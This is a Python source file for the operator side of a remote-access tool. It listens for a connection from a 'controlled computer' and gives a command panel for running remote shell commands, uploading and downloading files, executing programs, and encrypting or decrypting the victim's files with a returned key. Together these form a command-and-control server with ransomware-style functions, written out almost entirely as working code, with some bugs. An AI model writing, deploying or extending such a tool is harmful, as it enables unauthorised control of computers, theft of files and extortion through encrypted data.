import socket
import os
import sys
SERVER_HOST = "10.0.0.3"
SERVER_PORT = 5555
print(SERVER_PORT)



data = ""
l = ""
print("Welcome to the Shell!\nfor help press 'help'")




class Shell():
    def __init__(self):
        self.conn, self.client_address = self.Get_Connection()
        self.hostname, self.path = self.Get_Requiered_First_Data()



    def Get_Connection(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen(1)
        client_socket, client_address = s.accept()
        return client_socket, client_address

    def Get_Requiered_First_Data(self):
        d = self.conn.recv(1024).decode()
        return d.split(" ")[0], d.split(" ")[1]


    def Check_If_File_Exsists(self, args):


        if (os.path.isfile(self.path + args)):
            file = self.path + args
            return True, file
        if (os.path.isfile(args)):
            return True, args
        return False, " "



    def Exit(self, cmd):
        self.conn.send(cmd.encode())

    def Upload(self, cmd):
        if (len(cmd.split(" ")) == 3):
            if cmd.split(" ")[1] == '-f':
                file = cmd.split(" ")[2]
                flag, file = self.Check_If_File_Exsists(file)
                if (flag):
                    print(file)
                    f_name = file.split("\\")[len(file.split("\\")) - 1]
                    place = input('Where do you want to save the file in the controled computer? [Press D for the current working directory] ')
                    self.conn.send(str('Upload ' + place + " " + f_name).encode())
                    ans = self.conn.recv(1024)
                    while (ans == 'INVALID PATH'):
                        print("Invalid saving path! \n try again")
                        place = input('Where do you want to save the file in the controled computer? [Press D for the current working directory]')
                        self.conn.send(str('Upload' + place + " " + f_name).encode())
                    my_file = open(file, 'rb')
                    f1 = my_file.read(1024)
                    while f1:
                        if(len(f1) < 1024):
                            self.conn.send(f1 + "+".encode() * (1024 - len(f1)))
                            self.conn.send("EOF ".encode() + str((1024 - len(f1))).encode())
                            break
                        self.conn.send(f1)
                        f1 = my_file.read(1024)
                    msg = self.conn.recv(1024).decode()
                    print(msg)
                    return 0
                else:
                    print("We couldn't find the file!")
                    return -1

            elif cmd.split(" ")[1] == '-d':
                dir = cmd.split(" ")[2]
                if (os.path.isdir(dir)):
                    flag = True
                if (flag):
                    pass

            else:
                print("Invalid argument: " + cmd.split[" "][2])
                return -1
        else:
            print("the command expect 2 arguments! But it was given " + str(len(cmd.split(" ")) - 1))
            return -1

    def Download_File_To_Client(self, cmd):
        file_name = cmd.split("\\")[-1]
        while True:
            path1 = input("Where do you want to save the file? ")
            if (os.path.isdir(path1)):
                break
            print("Invalid path! please enter it correctly")
        file = open(path1 + "\\" + file_name, 'wb')
        print(file_name)
        data_to_file = b''
        while True:
            #print('receiving data...')
            data = self.conn.recv(1024)
            if ("EOF".encode() in data):
                if (int(data.decode().split(" ")[1]) > 0):
                    data_to_file = data_to_file[:-(int(data.decode().split(" ")[1]))]
                break
            data_to_file += data
        file.write(data_to_file)
        print("The file has been downloaded")
        file.close()

    def Save_Encryption_Key(self):
        self.conn.send("YES".encode())
        data = self.conn.recv(1024).decode()
        file = open("Info.txt", 'w')
        file.write(data)
        file.close()
        print("The key has been saved in this path: " + os.path.abspath(os.getcwd()) + "\\Info.txt")


    def Handel_Decryption_Request(self):
        key = input("Please enter your decryption key: ")
        self.conn.send(key.encode())
        dec_file = self.conn.recv(1024).decode()
        print("The filed have been decrypted, and saved as: " + dec_file)


    def Main_Panel(self):
        available_requests = ['download', 'shell', 'encrypt', 'decrypt', 'change', 'cd', 'execute']
        while True:
            # get the command from prompt
            cmd = input(str(self.client_address[0] + ":" + self.hostname + ": " + self.path + " > "))
            request = cmd.split(" ")[0]
            if request == "exit":
                self.Exit()
                break

            elif (request == "upload"):
                self.Upload(cmd)
                continue
            elif(request in available_requests):
                self.conn.send(cmd.encode())

            else:
                print("Invalid command!")
                continue

            result = self.conn.recv(16834).decode()

            if result.split(' ')[0] == 'PATH':
                self.path = result.split(" ")[1]

            elif result == 'DOWNLOAD':
                self.Download_File_To_Client(cmd)


            elif (result == 'encrypt'):
                print(self.conn.recv(1024).decode())
                ch = input("Do you want to save the Key as a file? [Y/N] ")
                if str(ch) == 'Y':
                    self.Save_Encryption_Key()
                else:
                    self.conn.send("NO".encode())
                    print("\n\n")

            elif (result == 'decrypt'):
                self.Handel_Decryption_Request()

            else:
                print(result)






shell = Shell()
shell.Main_Panel()









# close server connection
s.close()